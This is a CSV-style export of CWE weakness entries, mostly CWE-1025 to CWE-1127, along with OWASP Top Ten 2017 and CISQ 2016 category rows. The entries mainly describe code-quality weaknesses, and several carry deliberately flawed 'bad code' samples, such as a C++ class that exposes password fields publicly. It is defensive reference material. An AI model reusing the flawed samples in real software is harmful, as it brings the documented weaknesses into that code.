CWE-1025: Comparison Using Wrong Factors,"The code performs a comparison between two entities, but the comparison examines the wrong factors or characteristics of the entities, which can lead to incorrect results and resultant weaknesses.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent.(bad code)Example Language:JavaString str1 = new String(""Hello"");String str2 = new String(""Hello"");if (str1 == str2) {System.out.println(""str1 == str2"");}However, the if statement will not be executed as the strings are compared using the ""=="" operator. For Java objects, such as String objects, the ""=="" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method:(good code)if (str1.equals(str2)) {System.out.println(""str1 equals str2"");}",Phase:  TestingThoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.
CWE VIEW: Weaknesses in OWASP Top Ten (2017),"CWE nodes in this view (graph) are associated with the OWASP Top Ten, as released in 2017.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A1 - Injection,Weaknesses in this category are related to the A1 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A2 - Broken Authentication,Weaknesses in this category are related to the A2 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A3 - Sensitive Data Exposure,Weaknesses in this category are related to the A3 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A4 - XML External Entities (XXE),Weaknesses in this category are related to the A4 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A5 - Broken Access Control,Weaknesses in this category are related to the A5 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A6 - Security Misconfiguration,Weaknesses in this category are related to the A6 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A7 - Cross-Site Scripting (XSS),Weaknesses in this category are related to the A7 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A8 - Insecure Deserialization,Weaknesses in this category are related to the A8 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities,Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2017 Category A10 - Insufficient Logging & Monitoring,Weaknesses in this category are related to the A10 category in the OWASP Top Ten 2017.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1037: Processor Optimization Removal or Modification of Security-critical Code,"The developer builds a security-critical protection mechanism into the software, but the processor optimizes the execution of the program such that the mechanism is removed or modified.","Scope: Integrity, Impact: Technical Impact:Bypass Protection MechanismA successful exploitation of this weakness will change the order of an application's execution and will likely be used to bypass specific protection mechanisms. This bypass can be exploited further to potentially read data that should otherwise be unaccessible., Likelihood: High",无示范例子,无可能的缓解方案
CWE-1038: Insecure Automated Optimizations,"The product uses a mechanism that automatically optimizes code, e.g. to improve a characteristic such as performance, but the optimizations can have an unintended side effect that might violate an intended security assumption.","Scope: Integrity, Impact: Technical Impact:Alter Execution LogicThe optimizations alter the order of execution resulting in side effects that were not intended by the original developer., Likelihood: ",无示范例子,无可能的缓解方案
CWE-1039: Automated Recognition Mechanism with Inadequate Detection or Handling of Adversarial Input Perturbations,"The product uses an automated mechanism such as machine learning to recognize complex data inputs (e.g. image or audio) as a particular concept or category, but it does not properly detect or handle inputs that have been modified or constructed in a way that causes the mechanism to detect a different, incorrect concept.","Scope: Integrity, Impact: Technical Impact:Bypass Protection MechanismWhen the automated recognition is used in a protection mechanism, an attacker may be able to craft inputs that are misinterpreted in a way that grants excess privileges., Likelihood: ",无示范例子,无可能的缓解方案
CWE VIEW: Quality Weaknesses with Indirect Security Impacts,CWE identifiers in this view (slice) are quality issues that only indirectly make it easier to introduce a vulnerability and/or make the vulnerability more difficult to detect or mitigate.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1041: Use of Redundant Code,"The product has multiple functions, methods, procedures, macros, etc. that contain the same code.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ","Example 1In the following Java example the code performs some complex math when specific test conditions are met. The math is the same in each case and the equations are repeated within the code. Unfortunately if a future change needs to be made then that change needs to be made in all locations. This opens the door to mistakes being made and the changes not being made in the same way in each instance.(bad code)Example Language:Javapublic class Main {public static void main(String[] args) {double s = 10.0;double r = 1.0;double pi = 3.14159;double surface_area;if(r > 0.0) {// complex math equationssurface_area = pi * r * s + pi * Math.pow(r, 2);}if(r > 1.0) {// a complex set of mathsurface_area = pi * r * s + pi * Math.pow(r, 2);}}}It is recommended to place the complex math into its own function and then call that function whenever necessary.(good code)Example Language:Javapublic class Main {private double ComplexMath(double r, double s) {//complex math equationsdouble pi = Math.PI;double surface_area = pi * r * s + pi * Math.pow(r, 2);return surface_area;}public static void main(String[] args) {double s = 10.0;double r = 1.0;double surface_area;if(r > 0.0) {surface_area = ComplexMath(r, s);}if(r > 1.0) {surface_area = ComplexMath(r, s);}}}",Phase:  ImplementationMerge common functionality into a single function and then call that function from across the entire code base.
CWE-1042: Static Member Data Element outside of a Singleton Class Element,"The code contains a member element that is declared as static (but not final), in which its parent class element is not a singleton class - that is, a class element that can be used only once in the 'to' association of a Create action.","Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1043: Data Element Aggregating an Excessively Large Number of Non-Primitive Elements,The product uses a data element that has an excessively large number of sub-elements with non-primitive data types such as structures or aggregated objects.,"Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1044: Architecture with Number of Horizontal Layers Outside of Expected Range,The product's architecture contains too many - or too few - horizontal layers.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1045: Parent Class with a Virtual Destructor and a Child Class without a Virtual Destructor,"A parent class has a virtual destructor method, but the parent has a child class that does not have a virtual destructor.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1046: Creation of Immutable Text Using String Concatenation,The product creates an immutable text string using string concatenation operations.,"Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1047: Modules with Circular Dependencies,"The product contains modules in which one module has references that cycle back to itself, i.e., there are circular dependencies.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1048: Invokable Control Element with Large Number of Outward Calls,"The code contains callable control elements that contain an excessively large number of references to other application objects external to the context of the callable, i.e. a Fan-Out value that is excessively large.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1049: Excessive Data Query Operations in a Large Data Table,The product performs a data query with a large number of joins and sub-queries on a large data table.,"Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1050: Excessive Platform Resource Consumption within a Loop,"The product has a loop body or loop condition that contains a control element that directly or indirectly consumes platform resources, e.g. messaging, sessions, locks, or file descriptors.","Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1051: Initialization with Hard-Coded Network Resource Configuration Data,The product initializes data using hard-coded values that act as network resource identifiers.,"Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1052: Excessive Use of Hard-Coded Literals in Initialization,The product initializes a data element using a hard-coded literal that is not a simple integer or static constant element.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1053: Missing Documentation for Design,The product does not have documentation that represents how it is designed.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1054: Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer,"The code at one architectural layer invokes code that resides at a deeper layer than the adjacent layer, i.e., the invocation skips at least one layer, and the invoked code is not part of a vertical utility layer that can be referenced from any horizontal layer.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1055: Multiple Inheritance from Concrete Classes,The product contains a class with inheritance from more than one concrete class.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1056: Invokable Control Element with Variadic Parameters,A named-callable or method control element has a signature that supports a variable (variadic) number of parameters or arguments.,"Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1057: Data Access Operations Outside of Expected Data Manager Component,"The product uses a dedicated, central data manager component as required by design, but it contains code that performs data-access operations that do not use this data manager.","Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1058: Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element,The code contains a function or method that operates in a multi-threaded environment but owns an unsafe non-final static storable or member data element.,"Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1059: Insufficient Technical Documentation,"The product does not contain sufficient technical or engineering documentation (whether on paper or in electronic form) that contains descriptions of all the relevant software/hardware elements of the product, such as its usage, structure, architectural components, interfaces, design, implementation, configuration, operation, etc.","Scope: Other, Impact: Technical Impact:Varies by Context; Hide Activities; Reduce Reliability; Quality Degradation; Reduce MaintainabilityWithout a method of verification, one cannot be sure that everything only functions as expected., Likelihood: ",无示范例子,Phases:  Documentation; Architecture and DesignEnsure that design documentation is detailed enough to allow for post-manufacturing verification.
CWE-1060: Excessive Number of Inefficient Server-Side Data Accesses,The product performs too many data queries without using efficient data processing functionality such as stored procedures.,"Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1061: Insufficient Encapsulation,"The product does not sufficiently hide the internal representation and implementation details of data or methods, which might allow external components or modules to modify data unexpectedly, invoke unexpected functionality, or introduce dependencies that the programmer did not intend.",无常见后果信息,"Example 1The following example shows a basic user account class that includes member variables for the username and password as well as a public constructor for the class and a public method to authorize access to the user account.(bad code)Example Language:C++#define MAX_PASSWORD_LENGTH 15#define MAX_USERNAME_LENGTH 15class UserAccount{public:UserAccount(char *username, char *password){if ((strlen(username) > MAX_USERNAME_LENGTH) ||(strlen(password) > MAX_PASSWORD_LENGTH)) {ExitError(""Invalid username or password"");}strcpy(this->username, username);strcpy(this->password, password);}int authorizeAccess(char *username, char *password){if ((strlen(username) > MAX_USERNAME_LENGTH) ||(strlen(password) > MAX_PASSWORD_LENGTH)) {ExitError(""Invalid username or password"");}// if the username and password in the input parameters are equal to// the username and password of this account class then authorize accessif (strcmp(this->username, username) ||strcmp(this->password, password))return 0;// otherwise do not authorize accesselsereturn 1;}char username[MAX_USERNAME_LENGTH+1];char password[MAX_PASSWORD_LENGTH+1];};However, the member variables username and password are declared public and therefore will allow access and changes to the member variables to anyone with access to the object. These member variables should be declared private as shown below to prevent unauthorized access and changes.(good code)Example Language:C++class UserAccount{public:...private:char username[MAX_USERNAME_LENGTH+1];char password[MAX_PASSWORD_LENGTH+1];};",无可能的缓解方案
CWE-1062: Parent Class with References to Child Class,"The code has a parent class that contains references to a child class, its methods, or its members.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1063: Creation of Class Instance within a Static Code Block,A static code block creates an instance of a class.,"Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1064: Invokable Control Element with Signature Containing an Excessive Number of Parameters,"The product contains a function, subroutine, or method whose signature has an unnecessarily large number of parameters/arguments.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1065: Runtime Resource Management Control Element in a Component Built to Run on Application Servers,"The product uses deployed components from application servers, but it also uses low-level functions/methods for management of resources, instead of the API provided by the application server.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1066: Missing Serialization Control Element,The product contains a serializable data element that does not have an associated serialization method.,"Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1067: Excessive Execution of Sequential Searches of Data Resource,The product contains a data query against an SQL table or view that is configured in a way that does not utilize an index and may cause sequential searches to be performed.,"Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1068: Inconsistency Between Implementation and Documented Design,The implementation of the product is not consistent with the design as described within the relevant documentation.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1069: Empty Exception Block,"An invokable code block contains an exception handling block that does not contain any code, i.e. is empty.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ","Example 1In the following Java example, the code catches an ArithmeticException.(bad code)Example Language:Javapublic class Main {public static void main(String[] args) {int a = 1;int b = 0;int c = 0;try {c = a / b;} catch(ArithmeticException ae) {}}}Since the exception block is empty, no action is taken.In the code below the exception has been logged and the bad execution has been handled in the desired way allowing the program to continue in an expected way.(good code)Example Language:Javapublic class Main {public static void main(String[] args) {int a = 1;int b = 0;int c = 0;try {c = a / b;} catch(ArithmeticException ae) {log.error(""Divided by zero detected, setting to -1."");c = -1;}}}",Phase:  ImplementationFor every exception block add code that handles the specific exception in the way intended by the application.
CWE-1070: Serializable Data Element Containing non-Serializable Item Elements,"The product contains a serializable, storable data element such as a field or member, but the data element contains member elements that are not serializable.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1071: Empty Code Block,"The source code contains a block that does not contain any code, i.e., the block is empty.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ","Example 1In the following Java example, the code catches an ArithmeticException.(bad code)Example Language:Javapublic class Main {public static void main(String[] args) {int a = 1;int b = 0;int c = 0;try {c = a / b;} catch(ArithmeticException ae) {}}}Since the exception block is empty, no action is taken.In the code below the exception has been logged and the bad execution has been handled in the desired way allowing the program to continue in an expected way.(good code)Example Language:Javapublic class Main {public static void main(String[] args) {int a = 1;int b = 0;int c = 0;try {c = a / b;} catch(ArithmeticException ae) {log.error(""Divided by zero detected, setting to -1."");c = -1;}}}Example 2The following code attempts to synchronize on an object, but does not execute anything in the synchronized block. This does not actually accomplish anything and may be a sign that a programmer is wrestling with synchronization but has not yet achieved the result they intend.(bad code)Example Language:Javasynchronized(this) { }Instead, in a correct usage, the synchronized statement should contain procedures that access or modify data that is exposed to multiple threads. For example, consider a scenario in which several threads are accessing student records at the same time. The method which sets the student ID to a new value will need to make sure that nobody else is accessing this data at the same time and will require synchronization.(good code)public void setID(int ID){synchronized(this){this.ID = ID;}}",无可能的缓解方案
CWE-1072: Data Resource Access without Use of Connection Pooling,The product accesses a data resource through a database without using a connection pooling capability.,"Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1073: Non-SQL Invokable Control Element with Excessive Number of Data Resource Accesses,"The product contains a client with a function or method that contains a large number of data accesses/queries that are sent through a data manager, i.e., does not use efficient database capabilities.","Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1074: Class with Excessively Deep Inheritance,"A class has an inheritance level that is too high, i.e., it has a large number of parent classes.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1075: Unconditional Control Flow Transfer outside of Switch Block,"The product performs unconditional control transfer (such as a ""goto"") in code outside of a branching structure such as a switch block.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1076: Insufficient Adherence to Expected Conventions,"The product's architecture, source code, design, documentation, or other artifact does not follow required conventions.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1077: Floating Point Comparison with Incorrect Operator,"The code performs a comparison such as an equality test between two float (floating point) values, but it uses comparison operators that do not account for the possibility of loss of precision.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1078: Inappropriate Source Code Style or Formatting,"The source code does not follow desired style or formatting for indentation, white space, comments, etc.",无常见后果信息,"Example 1The usage of symbolic names instead of hard-coded constants is preferred.The following is an example of using a hard-coded constant instead of a symbolic name.(bad code)Example Language:Cchar buffer[1024];...fgets(buffer, 1024, stdin);If the buffer value needs to be changed, then it has to be altered in more than one place. If the developer forgets or does not find all occurrences, in this example it could lead to a buffer overflow.(good code)Example Language:Cenum { MAX_BUFFER_SIZE = 1024 };...char buffer[MAX_BUFFER_SIZE];...fgets(buffer, MAX_BUFFER_SIZE, stdin);In this example the developer will only need to change one value and all references to the buffer size are updated, as a symbolic name is used instead of a hard-coded constant.",无可能的缓解方案
CWE-1079: Parent Class without Virtual Destructor Method,"A parent class contains one or more child classes, but the parent class does not have a virtual destructor method.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1080: Source Code File with Excessive Number of Lines of Code,A source code file has too many lines of code.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE VIEW: Entries with Maintenance Notes,CWE entries in this view have maintenance notes. Maintenance notes are an indicator that an entry might change significantly in future versions. This view was created due to feedback from the CWE Board and participants in the CWE Compatibility Summit in March 2021.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1082: Class Instance Self Destruction Control Element,The code contains a class instance that calls the method or function to delete or destroy itself.,"Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1083: Data Access from Outside Expected Data Manager Component,"The product is intended to manage data access through a particular data manager component such as a relational or non-SQL database, but it contains code that performs data access operations without using that component.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1084: Invokable Control Element with Excessive File or Data Access Operations,A function or method contains too many operations that utilize a data manager or file resource.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1085: Invokable Control Element with Excessive Volume of Commented-out Code,"A function, method, procedure, etc. contains an excessive amount of code that has been commented out within its body.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1086: Class with Excessive Number of Child Classes,A class contains an unnecessarily large number of children.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1087: Class with Virtual Method without a Virtual Destructor,"A class contains a virtual method, but the method does not have an associated virtual destructor.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1088: Synchronous Access of Remote Resource without Timeout,"The code has a synchronous call to a remote resource, but there is no timeout for the call, or the timeout is set to infinite.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1089: Large Data Table with Excessive Number of Indices,The product uses a large data table that contains an excessively large number of indices.,"Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1090: Method Containing Access of a Member Element from Another Class,A method for a class performs an operation that directly accesses a member element from another class.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1091: Use of Object without Invoking Destructor Method,The product contains a method that accesses an object but does not later invoke the element's associated finalize/destructor method.,"Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1092: Use of Same Invokable Control Element in Multiple Architectural Layers,The product uses the same control element across multiple architectural layers.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1093: Excessively Complex Data Representation,The product uses an unnecessarily complex internal representation for its data structures or interrelationships between those structures.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ; Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1094: Excessive Index Range Scan for a Data Resource,"The product contains an index range scan for a large data table, but the scan can cover a large number of rows.","Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1095: Loop Condition Value Update within the Loop,The product uses a loop with a control flow condition based on a value that is updated within the body of the loop.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1096: Singleton Class Instance Creation without Proper Locking or Synchronization,The product implements a Singleton design pattern but does not use appropriate locking or other synchronization mechanism to ensure that the singleton class is only instantiated once.,"Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1097: Persistent Storable Data Element without Associated Comparison Control Element,The product uses a storable data element that does not have all of the associated functions or methods that are necessary to support comparison.,"Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1098: Data Element containing Pointer Item without Proper Copy Control Element,The code contains a data element with a pointer that does not have an associated copy or constructor method.,"Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1099: Inconsistent Naming Conventions for Identifiers,"The product's code, documentation, or other artifacts do not consistently use the same naming conventions for variables, callables, groups of related callables, I/O capabilities, data types, file names, or similar types of elements.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1100: Insufficient Isolation of System-Dependent Functions,The product or code does not isolate system-dependent functionality into separate standalone modules.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1101: Reliance on Runtime Component in Generated Code,The product uses automatically-generated code that cannot be executed without a specific runtime support component.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1102: Reliance on Machine-Dependent Data Representation,"The code uses a data representation that relies on low-level data representation or constructs that may vary across different processors, physical machines, OSes, or other physical components.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1103: Use of Platform-Dependent Third Party Components,The product relies on third-party components that do not provide equivalent functionality across all desirable platforms.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1104: Use of Unmaintained Third Party Components,The product relies on third-party components that are not actively supported or maintained by the original developer or a trusted proxy for the original developer.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1105: Insufficient Encapsulation of Machine-Dependent Functionality,"The product or code uses machine-dependent functionality, but it does not sufficiently encapsulate or isolate this functionality from the rest of the code.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ","Example 1In this example function, the memory address of variable b is derived by adding 1 to the address of variable a. This derived address is then used to assign the value 0 to b.(bad code)Example Language:Cvoid example() {char a;char b;*(&a + 1) = 0;}Here, b may not be one byte past a. It may be one byte in front of a. Or, they may have three bytes between them because they are aligned on 32-bit boundaries.",无可能的缓解方案
CWE-1106: Insufficient Use of Symbolic Constants,"The source code uses literal constants that may need to change or evolve over time, instead of using symbolic constants.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1107: Insufficient Isolation of Symbolic Constant Definitions,"The source code uses symbolic constants, but it does not sufficiently place the definitions of these constants into a more centralized or isolated location.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1108: Excessive Reliance on Global Variables,"The code is structured in a way that relies too much on using or setting global variables throughout various points in the code, instead of preserving the associated information in a narrower, more local context.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1109: Use of Same Variable for Multiple Purposes,"The code contains a callable, block, or other code element in which the same variable is used to control more than one unique task or store more than one instance of data.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1110: Incomplete Design Documentation,"The product's design documentation does not adequately describe control flow, data flow, system initialization, relationships between tasks, components, rationales, or other important aspects of the design.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1111: Incomplete I/O Documentation,"The product's documentation does not adequately define inputs, outputs, or system/software interfaces.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1112: Incomplete Documentation of Program Execution,The document does not fully define all mechanisms that are used to control or influence how product-specific programs are executed.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1113: Inappropriate Comment Style,The source code uses comment styles or formats that are inconsistent or do not follow expected standards for the product.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1114: Inappropriate Whitespace Style,The source code contains whitespace that is inconsistent across the code or does not follow expected standards for the product.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1115: Source Code Element without Standard Prologue,The source code contains elements such as source files that do not consistently provide a prologue or header that has been standardized for the project.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1116: Inaccurate Comments,The source code contains comments that do not accurately describe or explain aspects of the portion of the code with which the comment is associated.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ","Example 1In the following Java example the code performs a calculation to determine how much medicine to administer. A comment is provided to give insight into what the calculation shoud be doing. Unfortunately the comment does not match the actual code and thus leaves the reader to wonder which is correct.(bad code)Example Language:Javapublic class Main {public static void main(String[] args) {int pt_weight = 83;int mg_per_kg = 3;int daily_dose = 0;// Add the patient weight and Mg/Kg to calculate the correct daily dosedaily_dose = pt_weight * mg_per_kg;return dosage;}}In the correction below, the code functionality has been verified, and the comment has been corrected to reflect the proper calculation.(good code)Example Language:Javapublic class Main {public static void main(String[] args) {int pt_weight = 83;int mg_per_kg = 3;int daily_dose = 0;// Multiply the patient weight and Mg/Kg to calculate the correct daily dosedaily_dose = pt_weight * mg_per_kg;return dosage;}}Note that in real-world code, these values should be validated to disallow negative numbers, prevent integer overflow, etc.",Phase:  ImplementationVerify that each comment accurately reflects what is intended to happen during execution of the code.
CWE-1117: Callable with Insufficient Behavioral Summary,"The code contains a function or method whose signature and/or associated inline documentation does not sufficiently describe the callable's inputs, outputs, side effects, assumptions, or return codes.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1118: Insufficient Documentation of Error Handling Techniques,"The documentation does not sufficiently describe the techniques that are used for error handling, exception processing, or similar mechanisms.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1119: Excessive Use of Unconditional Branching,"The code uses too many unconditional branches (such as ""goto"").","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1120: Excessive Code Complexity,"The code is too complex, as calculated using a well-defined, quantitative measure.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ; Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1121: Excessive McCabe Cyclomatic Complexity,The code contains McCabe cyclomatic complexity that exceeds a desirable maximum.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1122: Excessive Halstead Complexity,The code is structured in a way that a Halstead complexity measure exceeds a desirable maximum.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1123: Excessive Use of Self-Modifying Code,The product uses too much self-modifying code.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1124: Excessively Deep Nesting,The code contains a callable or other code grouping in which the nesting / branching is too deep.,"Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1125: Excessive Attack Surface,The product has an attack surface whose quantitative measurement exceeds a desirable maximum.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1126: Declaration of Variable with Unnecessarily Wide Scope,"The source code declares a variable in one scope, but the variable is only used within a narrower scope.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1127: Compilation with Insufficient Warnings or Errors,"The code is compiled without sufficient warnings enabled, which may prevent the detection of subtle bugs or quality issues.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ",无示范例子,无可能的缓解方案
CWE VIEW: CISQ Quality Measures (2016),"This view outlines the most important software quality issues as identified by the Consortium for Information & Software Quality (CISQ) Automated Quality Characteristic Measures, released in 2016. These measures are derived from Object Management Group (OMG) standards.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CISQ Quality Measures (2016) - Reliability,"Weaknesses in this category are related to the CISQ Quality Measures for Reliability, as documented in 2016 with the Automated Source Code CISQ Reliability Measure (ASCRM) Specification 1.0. Presence of these weaknesses could reduce the reliability of the software.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CISQ Quality Measures (2016) - Maintainability,"Weaknesses in this category are related to the CISQ Quality Measures for Maintainability, as documented in 2016 with the Automated Source Code Maintainability Measure (ASCMM) Specification 1.0. Presence of these weaknesses could reduce the maintainability of the software.",无常见后果信息,无示范例子,无可能的缓解方案
